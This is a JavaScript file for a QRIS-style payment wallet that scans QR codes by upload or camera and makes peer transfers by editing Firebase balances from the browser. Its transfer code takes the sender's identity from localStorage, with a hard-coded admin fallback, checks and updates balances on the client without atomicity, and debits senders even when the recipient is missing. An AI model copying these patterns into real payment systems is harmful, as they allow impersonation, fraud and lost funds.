function handleQrisUpload(input) {
    if (input.files && input.files[0]) {
        const reader = new FileReader();
        reader.onload = function(e) {
            const img = new Image();
            img.onload = function() {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = img.width; canvas.height = img.height;
                ctx.drawImage(img, 0, 0, img.width, img.height);
                const imgData = ctx.getImageData(0, 0, img.width, img.height);
                
                // Gunakan jsQR untuk decode gambar upload
                const code = jsQR(imgData.data, imgData.width, imgData.height);
                if (code) { processDecodedQrData(code.data); } else { Swal.fire('FAIL', 'QRIS tidak terdeteksi.', 'error'); }
            };
            img.src = e.target.result;
        };
        reader.readAsDataURL(input.files[0]);
    }
}

// --- ENGINE LIVE SCANNER KAMERA ---
function startLiveScan() {
    document.getElementById('scan-modal').style.display = 'flex';
    const video = document.getElementById('scan-video');
    
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }).then(stream => {
        localStream = stream; video.srcObject = stream; video.setAttribute("playsinline", true); video.play();
        scanInterval = setInterval(captureFrameAndDecode, 300);
    }).catch(() => Swal.fire('ERROR', 'Gagal mengakses kamera.', 'error'));
}

function stopLiveScan() {
    document.getElementById('scan-modal').style.display = 'none';
    if(scanInterval) clearInterval(scanInterval);
    if(localStream) localStream.getTracks().forEach(track => track.stop());
}

function captureFrameAndDecode() {
    const video = document.getElementById('scan-video');
    const canvas = document.getElementById('scan-canvas');
    if (video.readyState === video.HAVE_ENOUGH_DATA) {
        canvas.height = video.videoHeight; canvas.width = video.videoWidth;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const code = jsQR(imgData.data, imgData.width, imgData.height);
        if (code) { stopLiveScan(); processDecodedQrData(code.data); }
    }
}

// --- PROCESSING DECODED RAW DATA TO GATEWAY ---
function processDecodedQrData(rawData) {
    try {
        const data = JSON.parse(rawData);
        if (data.creator && data.type) {
            // Cek kadaluwarsa tipe dinamis (5 Jam = 18.000.000 ms)
            if (data.type === 'dinamis') {
                const hoursPassed = (Date.now() - data.timestamp);
                if (hoursPassed > 18000000) { Swal.fire('HANGUS', 'QRIS Dinamis ini telah kadaluwarsa (lebih dari 5 jam)!', 'error'); return; }
            }
            openTransferModal(data.creator, data.amount > 0 ? data.amount : '');
        } else { openTransferModal(rawData, ''); }
    } catch(e) { openTransferModal(rawData, ''); }
}

function executeTransfer() {
    const target = document.getElementById('tf-target').value.trim();
    const amount = parseInt(document.getElementById('tf-amount').value) || 0;
    
    const sessionUser = localStorage.getItem('currentUser') || localStorage.getItem('isLoggedIn') || "admin@cube_pml.io";
    let myEmail = sessionUser.includes('{') ? JSON.parse(sessionUser).email : sessionUser;

    if (!target || amount <= 0) { Swal.fire('ERROR', 'Lengkapi parameter data transfer!', 'warning'); return; }
    if (target === myEmail) { Swal.fire('DENIED', 'Tidak bisa mentransfer ke akun sendiri!', 'warning'); return; }

    const cleanMyEmail = myEmail.replace(/\./g, ',');
    const cleanTargetEmail = target.replace(/\./g, ',');
    const timeStr = new Date().toLocaleTimeString();

    // 1. Ambil data pengirim dulu dari Firebase untuk cek saldo kecukupan
    firebase.database().ref('users/' + cleanMyEmail).once('value').then(snapshot => {
        if(!snapshot.exists()) return;
        const myData = snapshot.val();

        if (myData.balance < amount) { 
            Swal.fire('LIMIT', 'Saldo Node Anda tidak mencukupi!', 'error'); 
            return; 
        }

        // 2. Kurangi saldo pengirim di Firebase & buat log histori
        const newMyBalance = myData.balance - amount;
        firebase.database().ref('users/' + cleanMyEmail).update({
            balance: newMyBalance
        });
        // Simpan log keluar pengirim
        firebase.database().ref('users/' + cleanMyEmail + '/history').push({
            type: 'out', amount: amount, desc: `TF ke ${target.split('@')[0].toUpperCase()}`, time: timeStr
        });

        // 3. Tambahkan saldo ke target di Firebase (HP Teman Lo)
        firebase.database().ref('users/' + cleanTargetEmail).once('value').then(targetSnapshot => {
            if(targetSnapshot.exists()) {
                const targetData = targetSnapshot.val();
                const newTargetBalance = (targetData.balance || 0) + amount;
                
                firebase.database().ref('users/' + cleanTargetEmail).update({
                    balance: newTargetBalance
                });
                // Simpan log masuk penerima
                firebase.database().ref('users/' + cleanTargetEmail + '/history').push({
                    type: 'in', amount: amount, desc: `Terima dari ${myData.username.toUpperCase()}`, time: timeStr
                });
            }
        });

        closeTransferModal();
        Swal.fire('TRANSMITTED', `Sukses transfer Rp ${amount.toLocaleString()} ke ${target}`, 'success');
        
        // Panggil fungsi refresh data dashboard lo
        initFinancialData(); 
    });
}